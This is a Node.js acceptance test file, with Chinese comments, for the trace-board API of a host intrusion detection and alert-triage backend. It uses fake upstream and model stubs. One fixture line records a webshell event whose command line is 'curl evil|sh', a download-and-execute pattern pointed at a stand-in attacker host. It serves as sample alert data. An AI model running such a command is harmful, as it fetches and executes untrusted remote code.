// P003-T014 后端验收（黑盒）：断言只按 docs/modules/trace-board.md、docs/modules/http-api.md、
// docs/modules/evidence-tools.md、docs/modules/triage-pipeline.md 与 openapi.yaml 的 trace 段写，
// 不参考 trace-board.js / server.js 的实现内容。
//
// 跑法（仓根）：
//   node --test evidence/test/P003-T014/acceptance.test.js
//
// 装配说明：
// - HTTP 层用 createServer 的 9 号参数注入 boardService（docs/modules/http-api.md §2「createServer 是依赖注入点」）。
// - 服务层用公开类 TraceBoardService（docs/modules/trace-board.md §2.1 构造参数 toolbox / model / promptStore / directory / analysis）
//   与公开类 AgentToolbox（docs/modules/evidence-tools.md §3），上游用假 MCP 客户端。
// - A4 走文档里的生产路径 createAnalysisProvider({ monitor, history })（docs/modules/trace-board.md §4.3）：
//   真 InvestigationStore 存一条带 case_dir 的记录，案卷 01-原始告警.txt 放一行 syslog。
// 全局根隔离（P003-T050 A2）：必须是本文件第一个 import——它要在 server.js / wiki-store.js 求值前
// 把 HIDS_DATA_DIR 指到本进程的临时根；否则缺省库指着真全局根（fp-sessions 写、wiki/rules 读→种子）。
import { BoardStore } from '../../../src/contexts/trace/infrastructure/board-store.js';
import { assertIsolatedRoot } from '../P003-T034/isolate-data-root.js';
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { createServer, createAnalysisProvider } from '../../../server.js';
import { TraceBoardService } from '../../../src/contexts/trace/application/trace-service.js';;
import { AgentToolbox, investigationToolNames } from '../../../src/contexts/triage/infrastructure/evidence-toolbox.js';
import { InvestigationStore } from '../../../src/contexts/triage/infrastructure/investigation-store.js';

const SYSLOG_ID = (type, fp, sec, uuid) => `syslog:${type}:${fp}:${sec}:${uuid}`;

/* ---------------- 装置 ---------------- */

// 假 MCP 客户端：工具名全用深度研判白名单里的真名，避免「工具不在目录」这条闸把行为盖住。
const UPSTREAM_EVENT = { id: 7, host_view: { host_id: 41, host_ip: '10.0.0.5' }, source_ip: '192.0.2.9',
  event_create_time: '2026-11-17 10:00:00', event_name: 'webshell', process_command_line: 'curl evil|sh' };

function fakeClient(callLog, respond = (name) => (/^get_.*_event$/.test(name) ? UPSTREAM_EVENT : { events: [], total: 0 })) {
  // 参数表按 docs/modules/evidence-tools.md §5.1 的合法域列出，避免「未知参数」这道闸把服务层真发起的调用挡在假上游之前。
  const properties = {
    id: { type: 'integer' }, count: { type: 'integer' }, offset: { type: 'integer' },
    host_id: { type: 'integer' }, types: { type: 'array', items: { type: 'string' } },
    host_ip: { type: 'string' }, source_ip: { type: 'string' }
  };
  return {
    listTools: async () => investigationToolNames.map((name) => ({ name, description: '', inputSchema: { type: 'object', properties } })),
    callTool: async (name, args) => { callLog.push([name, args]); return respond(name, args); }
  };
}

function fakeModel() {
  // 立刻收尾，让后台追查循环不在验收窗口里跑工具。
  return { model: 'fake', complete: async () => ({ content: JSON.stringify({ action: 'conclude', summary: '验收停止' }) }) };
}

async function listen(server) {
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  return { server, base: `http://127.0.0.1:${server.address().port}` };
}

async function call(base, method, p, body) {
  const res = await fetch(base + p, {
    method,
    headers: body === undefined ? undefined : { 'content-type': 'application/json' },
    body: body === undefined ? undefined : JSON.stringify(body)
  });
  const text = await res.text();
  let json; try { json = JSON.parse(text); } catch { json = null; }
  return { status: res.status, json, text, headers: res.headers };
}

// 按 openapi.yaml TraceBoard / TraceBoardHop / TraceBoardLink / TraceBoardGap / TraceBoardDiscovery 逐条校验
function assertTraceBoardShape(board) {
  assert.equal(typeof board.id, 'string');
  assert.ok(['running', 'done', 'failed', 'interrupted'].includes(board.status), `status 枚举外：${board.status}`);
  assert.ok(Array.isArray(board.hops), 'hops 不是数组');
  assert.ok(Array.isArray(board.links), 'links 不是数组');
  assert.ok(Array.isArray(board.gaps), 'gaps 不是数组');
  assert.ok(Array.isArray(board.discovery), 'discovery 不是数组');
  assert.equal(typeof board.chain_length, 'integer'.replace('integer', 'number'));
  assert.equal(typeof board.has_gaps, 'boolean');
  for (const hop of board.hops) {
    for (const key of ['id', 'kind', 'label', 'host', 'occurred_at', 'evidence_id', 'discovered']) {
      assert.ok(key in hop, `hop 缺必填字段 ${key}：${JSON.stringify(hop)}`);
    }
    assert.ok(['alert', 'host', 'process', 'file', 'account', 'request'].includes(hop.kind), `hop.kind 枚举外：${hop.kind}`);
    assert.equal(typeof hop.discovered, 'number');
  }
  for (const link of board.links) {
    for (const key of ['id', 'from', 'to', 'rel', 'evidence_id']) assert.ok(key in link, `link 缺必填字段 ${key}`);
  }
  for (const gap of board.gaps) {
    assert.ok('hop_id' in gap && 'reason' in gap, `gap 不是 {hop_id, reason}：${JSON.stringify(gap)}`);
    assert.ok(gap.hop_id === null || typeof gap.hop_id === 'string');
    assert.equal(typeof gap.reason, 'string');
  }
  for (const step of board.discovery) {
    assert.equal(typeof step.step, 'number');
    assert.ok(['hop', 'link'].includes(step.kind), `discovery.kind 枚举外：${step.kind}`);
    assert.equal(typeof step.id, 'string');
  }
  // openapi 与 docs §3.3：链长 = hops 个数；has_gaps = gaps 非空
  assert.equal(board.chain_length, board.hops.length, 'chain_length 应等于 hops 个数');
  assert.equal(board.has_gaps, board.gaps.length > 0, 'has_gaps 应与 gaps 非空一致');
}

function assertSummaryShape(row) {
  for (const key of ['id', 'status', 'chain_length', 'has_gaps']) assert.ok(key in row, `summary 缺必填字段 ${key}`);
  assert.ok(['running', 'done', 'failed', 'interrupted'].includes(row.status));
  assert.equal(typeof row.chain_length, 'number');
  assert.equal(typeof row.has_gaps, 'boolean');
  assert.ok(row.type === null || typeof row.type === 'string');
  assert.ok(row.host === null || typeof row.host === 'string');
  assert.ok(row.occurred_at === null || typeof row.occurred_at === 'string');
}

function assertErrorShape(body) {
  assert.ok(body && typeof body === 'object', '错误响应不是 JSON 对象');
  assert.equal(typeof body.error, 'string');
}

// 一套「真服务 + 真 HTTP」的装置
async function realStack({ withAnalysis = false } = {}) {
  const base = await mkdtemp(path.join(tmpdir(), 'p003-t014-'));
  const boardsDir = path.join(base, 'boards');
  await mkdir(boardsDir, { recursive: true });
  const callLog = [];
  const toolbox = new AgentToolbox(fakeClient(callLog));
  const model = fakeModel();
  let analysis = null;
  let history = null;
  let cases = [];
  if (withAnalysis) {
    const recordsDir = path.join(base, 'records');
    history = new InvestigationStore(recordsDir);
    analysis = createAnalysisProvider({ monitor: null, history });
    // 造两条带案卷的分析记录：主机、事件时间、类型各不相同
    const specs = [
      { id: SYSLOG_ID('webshell', '1a6bcb1dceac0b7a', 1763373600, '6f1b6a4e-4d3a-4b8e-9a4e-2f6f1b6a4e43'),
        host: '10.0.0.5', source: '192.0.2.9', at: '2026-11-17 10:00:00' },
      { id: SYSLOG_ID('honeypot', '2b7cdc2edfbd1c8b', 1765965600, '7a2c7b5f-5e4b-4c9f-bb5f-3a7f2c6d8e91'),
        host: '10.0.0.6', source: '198.51.100.7', at: '2026-12-17 10:00:00' }
    ];
    for (const spec of specs) {
      const caseDir = path.join(base, 'cases', spec.id.replace(/[:]/g, '_'));
      await mkdir(caseDir, { recursive: true });
      const msgid = spec.id.split(':')[1] === 'webshell' ? 'cloudwalker-webshell' : 'cloudwalker-honeypot';
      const raw = `<134>1 2026-11-17T10:00:00Z host app - ${msgid} ` +
        JSON.stringify({ event_id: 7, host_ip: spec.host, source_ip: spec.source,
          event_create_time: spec.at, event_name: spec.id.split(':')[1] });
      await writeFile(path.join(caseDir, '01-原始告警.txt'), raw + '\n');
      await history.save({ alert_id: spec.id, mode: 'deep', verdict: 'real_threat', case_dir: caseDir });
      cases.push(spec);
    }
  }
  const service = new TraceBoardService({ store: new BoardStore(boardsDir), toolbox, model, directory: boardsDir, analysis });
  const server = createServer(undefined, undefined, undefined, undefined, undefined, undefined,
    undefined, undefined, service);
  const { base: url } = await listen(server);
  return { base: url, server, service, callLog, boardsDir, cases, history };
}

/* ---------------- A1：从一条告警创建溯源；已有则返回那条 ---------------- */

// 隔离自证（P003-T050 A5 的牙）：删掉文件头那行 import，这条立刻红。
test('全局根隔离（P003-T050 A2）：本文件的数据根是临时根，不是真实全局根', () => assertIsolatedRoot());

test('A1 IP 起点：POST 新建回 202，白板形状合 TraceBoard 契约，服务端落盘', async () => {
  const stack = await realStack();
  try {
    const res = await call(stack.base, 'POST', '/api/trace/boards', { target: '10.9.9.9', focus: '看一眼' });
    assert.equal(res.status, 202, res.text);
    assertTraceBoardShape(res.json);
    assert.equal(res.json.id, 'ip:10.9.9.9');
    assert.equal(res.json.focus, '看一眼');
    // 手填 IP 起的板：alert.type / occurred_at 为 null（docs §3.3、openapi TraceBoardAlert）
    assert.equal(res.json.alert.type, null);
    assert.equal(res.json.alert.occurred_at, null);
    // 同一目标再来一次：200，原样返回那条，不重查（toolbox 零调用）
    const before = stack.callLog.length;
    const again = await call(stack.base, 'POST', '/api/trace/boards', { target: '10.9.9.9' });
    assert.equal(again.status, 200, again.text);
    assert.equal(again.json.id, res.json.id);
    assert.equal(stack.callLog.length, before, '已有白板时不应再查上游');
  } finally { stack.server.close(); }
});

test('A1 告警起点：没有分析记录时 POST 回 422 且是 {error} 形状；非法目标回 400', async () => {
  const stack = await realStack({ withAnalysis: true });
  try {
    const bad = await call(stack.base, 'POST', '/api/trace/boards', { target: 'not-a-target' });
    assert.equal(bad.status, 400);
    assertErrorShape(bad.json);
    assert.match(bad.json.error, /有效告警 ID 或 IPv4/);

    const noBody = await call(stack.base, 'POST', '/api/trace/boards', {});
    assert.equal(noBody.status, 400);
    assertErrorShape(noBody.json);

    const orphan = await call(stack.base, 'POST', '/api/trace/boards',
      { target: SYSLOG_ID('malware', 'ffffffffffffffff', 1763373600, '11111111-2222-3333-4444-555555555555') });
    assert.equal(orphan.status, 422, orphan.text);
    assertErrorShape(orphan.json);
  } finally { stack.server.close(); }
});

/* ---------------- A2：列表字段、筛选、分页 ---------------- */

test('A2 列表：字段齐全，chain_length / has_gaps 与详情一致，分页与筛选按文档口径', async () => {
  const stack = await realStack({ withAnalysis: true });
  try {
    const [ws, hp] = stack.cases;
    assert.equal((await call(stack.base, 'POST', '/api/trace/boards', { target: ws.id })).status, 202);
    assert.equal((await call(stack.base, 'POST', '/api/trace/boards', { target: hp.id })).status, 202);
    assert.equal((await call(stack.base, 'POST', '/api/trace/boards', { target: '10.9.9.9' })).status, 202);

    const all = await call(stack.base, 'GET', '/api/trace/boards');
    assert.equal(all.status, 200);
    assert.ok(Array.isArray(all.json.boards));
    assert.equal(typeof all.json.total, 'number');
    assert.equal(all.json.total, all.json.boards.length, '无筛选时 total 应等于返回条数');
    for (const row of all.json.boards) assertSummaryShape(row);

    // 列表 chain_length 与详情 hops 个数一致
    for (const row of all.json.boards) {
      const detail = await call(stack.base, 'GET', `/api/trace/boards/${encodeURIComponent(row.id)}`);
      assert.equal(detail.status, 200, detail.text);
      assert.equal(row.chain_length, detail.json.hops.length, `列表与详情的链长不一致：${row.id}`);
      assert.equal(row.has_gaps, detail.json.gaps.length > 0, `列表与详情断点标记不一致：${row.id}`);
    }

    // type 筛选：IP 起的板没有类型，不会被选中
    const byType = await call(stack.base, 'GET', '/api/trace/boards?type=webshell');
    assert.equal(byType.status, 200);
    assert.ok(byType.json.boards.every((b) => b.type === 'webshell'));
    assert.ok(byType.json.total >= 1);

    // host 精确筛
    const byHost = await call(stack.base, 'GET', `/api/trace/boards?host=${ws.host}`);
    assert.equal(byHost.status, 200);
    assert.deepEqual(byHost.json.boards.map((b) => b.host), [ws.host]);

    // from/to 按告警时间比，含端点
    const at = (iso) => encodeURIComponent(iso);
    const wide = await call(stack.base, 'GET', `/api/trace/boards?from=${at('2026-01-01T00:00:00Z')}&to=${at('2027-01-01T00:00:00Z')}`);
    assert.equal(wide.status, 200);
    const narrow = await call(stack.base, 'GET', `/api/trace/boards?from=${at('2026-12-01T00:00:00Z')}&to=${at('2027-01-01T00:00:00Z')}`);
    assert.equal(narrow.status, 200);
    assert.equal(narrow.json.total, 1, '12 月窗口只该选中 honeypot 那条');
    assert.equal(narrow.json.boards[0].host, hp.host);

    // 分页：count 缺省 20，超出剩余条数回空数组，total 仍是筛后总数
    const page = await call(stack.base, 'GET', '/api/trace/boards?count=1&offset=0');
    assert.equal(page.status, 200);
    assert.equal(page.json.boards.length, 1);
    assert.equal(page.json.total, all.json.total);
    const tail = await call(stack.base, 'GET', '/api/trace/boards?count=10&offset=99');
    assert.equal(tail.status, 200);
    assert.deepEqual(tail.json.boards, []);
    assert.equal(tail.json.total, all.json.total);

    // status 多选：不要 interrupted 一条也选不中；四种全给等于不筛
    const none = await call(stack.base, 'GET', '/api/trace/boards?status=interrupted');
    assert.equal(none.status, 200);
    assert.equal(none.json.total, 0);
    const four = await call(stack.base, 'GET', '/api/trace/boards?status=running,done,failed,interrupted');
    assert.equal(four.status, 200);
    assert.equal(four.json.total, all.json.total);
  } finally { stack.server.close(); }
});

test('A2 参数边界：分页与筛选的每条非法值都回 400 且带 error 正文', async () => {
  const stack = await realStack();
  try {
    const cases = ['?count=0', '?count=51', '?count=abc', '?count=1.5', '?offset=-1', '?offset=abc',
      '?status=bogus', '?from=abc', '?to=abc', '?from=2026-02-01T00:00:00Z&to=2026-01-01T00:00:00Z'];
    for (const query of cases) {
      const res = await call(stack.base, 'GET', `/api/trace/boards${query}`);
      assert.equal(res.status, 400, `${query} 应回 400，实际 ${res.status}`);
      assertErrorShape(res.json);
    }
  } finally { stack.server.close(); }
});

/* ---------------- A3：详情 hops / links / gaps / discovery，线从更晚指向更早 ---------------- */

test('A3 详情：links 由更晚指向更早，旧板字符串缺口归一成 {hop_id:null, reason}，discovery 补齐', async () => {
  const stack = await realStack();
  try {
    // 旧白板文件按 docs §3 的形状直接落盘（图存储层就是 JSON 文件，见 §5.4）
    const board = {
      id: 'webshell:1', alert_id: 'webshell:1', run_id: '11111111-1111-4111-8111-111111111111',
      title: 'WebShell 落地', seed: 'asset:10.0.0.5',
      status: 'done', created_at: '2026-11-17T09:00:00.000Z', updated_at: '2026-11-17T11:00:00.000Z',
      alert: { id: 'webshell:1', type: 'webshell', title: 'WebShell 落地', host: '10.0.0.5', occurred_at: '2026-11-17T10:00:00.000Z' },
      window: { since: '2026-11-16T10:00:00.000Z', until: '2026-11-19T10:00:00.000Z', hours: 72 },
      nodes: [
        { id: 'asset:10.0.0.5', kind: 'asset', label: 'web-1', address: '10.0.0.5', status: 'done',
          why: '告警主机', profile: {}, findings: [], finding_count: 0, discovered_from: [],
          occurred_at: '2026-11-17T10:00:00.000Z', investigated_at: '2026-11-17T10:30:00.000Z' },
        { id: 'ip:192.0.2.9', kind: 'external_ip', label: '192.0.2.9', address: '192.0.2.9', status: 'done',
          why: '来源地址', profile: {}, findings: [], finding_count: 0, discovered_from: [],
          occurred_at: '2026-11-17T08:00:00.000Z', investigated_at: '2026-11-17T10:40:00.000Z' }
      ],
      edges: [
        { from: 'ip:192.0.2.9', to: 'asset:10.0.0.5', rel: '触达线索', why: '同一条连接记录', strength: 0.3,
          by: 'program', citations: [], at: '2026-11-17T10:45:00.000Z' }
      ],
      // 旧板：gaps 是字符串数组，应为读取时归一成 {hop_id:null, reason}
      gaps: ['HIDS 上没有更早的记录'],
      activity: [],
      summary: '', investigations: 2, model: 'fake', focus: '',
      origin_evidence: null
    };
    await writeFile(path.join(stack.boardsDir, 'webshell:1.json'), JSON.stringify(board));

    const res = await call(stack.base, 'GET', `/api/trace/boards/${encodeURIComponent('webshell:1')}`);
    assert.equal(res.status, 200, res.text);
    const detail = res.json;
    assertTraceBoardShape(detail);
    assert.equal(detail.hops.length, 2);
    // 告警那一跳在最前、kind=alert（openapi TraceBoard.hops 描述）
    assert.equal(detail.hops[0].kind, 'alert');
    assert.equal(detail.hops[0].discovered, 1);
    // 线方向：from 指向更晚（10:00 的告警那侧）、to 指向更早（08:00 的来源）。
    // 注意落盘的边是反的（from=08:00 的来源），方向由服务层按 occurred_at 重算（docs §4.3），
    // 所以这条断言同时校验「不照抄落盘方向」。
    assert.equal(detail.links.length, 1);
    const link = detail.links[0];
    const byId = new Map(detail.hops.map((h) => [h.id, h]));
    const fromHop = byId.get(link.from);
    const toHop = byId.get(link.to);
    assert.ok(fromHop && toHop, `link 端点不在 hops 里：${JSON.stringify(link)}`);
    assert.equal(fromHop.kind, 'alert', `from 应是更晚的告警那一跳：${JSON.stringify(link)}`);
    assert.equal(toHop.id, 'ip:192.0.2.9', `to 应是更早的原因一跳：${JSON.stringify(link)}`);
    assert.ok(new Date(fromHop.occurred_at) > new Date(toHop.occurred_at), 'from 应比 to 更晚');
    // 旧字符串缺口归一
    assert.deepEqual(detail.gaps, [{ hop_id: null, reason: 'HIDS 上没有更早的记录' }]);
    assert.equal(detail.has_gaps, true);
    assert.equal(detail.chain_length, 2);
    // 旧板没有 discovery 时按 hops、links 顺序补齐
    assert.equal(detail.discovery.length, detail.hops.length + detail.links.length);
    assert.equal(detail.discovery[0].kind, 'hop');
  } finally { stack.server.close(); }
});

test('A3 详情：没有白板回 404、目标格式非法回 400', async () => {
  const stack = await realStack();
  try {
    const missing = await call(stack.base, 'GET', `/api/trace/boards/${encodeURIComponent('webshell:404')}`);
    assert.equal(missing.status, 404, missing.text);
    assertErrorShape(missing.json);
    const bad = await call(stack.base, 'GET', '/api/trace/boards/%E4%B8%8D%E6%98%AF%E5%91%8A%E8%AD%A6');
    assert.equal(bad.status, 400, bad.text);
    assertErrorShape(bad.json);
  } finally { stack.server.close(); }
});

/* ---------------- A4：分析已取到的证据直接引用，不重查 ---------------- */

test('A4 syslog 告警：复用案卷原始报文起板，不调 get_<类型>_event，origin_evidence 标 reused', async () => {
  const stack = await realStack({ withAnalysis: true });
  try {
    const [ws] = stack.cases;
    const res = await call(stack.base, 'POST', '/api/trace/boards', { target: ws.id });
    assert.equal(res.status, 202, res.text);
    assertTraceBoardShape(res.json);
    assert.equal(res.json.alert.type, 'webshell');
    assert.equal(res.json.alert.host, ws.host);
    assert.equal(typeof res.json.alert.occurred_at, 'string');
    assert.equal(res.json.origin_evidence.evidence_id, 'syslog:1');
    assert.equal(res.json.origin_evidence.reused, true);
    const getCalls = stack.callLog.filter(([name]) => /^get_.*_event$/.test(name));
    assert.deepEqual(getCalls, [], `复用证据时不该再查事件详情：${JSON.stringify(getCalls)}`);

    // 对照（证伪用）：牧云告警没有分析记录时确实去查事件详情，起板成功且 origin_evidence 来自 cw:1
    const muc = await call(stack.base, 'POST', '/api/trace/boards', { target: 'webshell:7' });
    assert.equal(muc.status, 202, muc.text);
    assert.ok(stack.callLog.some(([name]) => name === 'get_webshell_event'),
      `牧云告警应走 get_webshell_event，实际调用：${JSON.stringify(stack.callLog.map(([n]) => n))}`);
    assert.equal(muc.json.alert.host, '10.0.0.5');
    assert.notEqual(muc.json.origin_evidence.reused, true, '牧云告警不是复用分析证据');
  } finally { stack.server.close(); }
});

/* ---------------- 公开面：503 与工具清单 ---------------- */

test('没有白板服务时三条路由都回 503；/api/trace/tools 没有 MCP 工具箱回 503', async () => {
  const server = createServer(); // 全默认：本机没配牧云/模型，白板服务为 null
  const { base } = await listen(server);
  try {
    for (const [method, p, body] of [['GET', '/api/trace/boards', undefined],
      ['POST', '/api/trace/boards', { target: '10.9.9.9' }],
      ['GET', '/api/trace/boards/webshell%3A1', undefined]]) {
      const res = await call(base, method, p, body);
      assert.equal(res.status, 503, `${method} ${p} 应回 503，实际 ${res.status}`);
      assertErrorShape(res.json);
    }
    const tools = await call(base, 'GET', '/api/trace/tools');
    assert.equal(tools.status, 503, tools.text);
    assertErrorShape(tools.json);
  } finally { server.close(); }
});
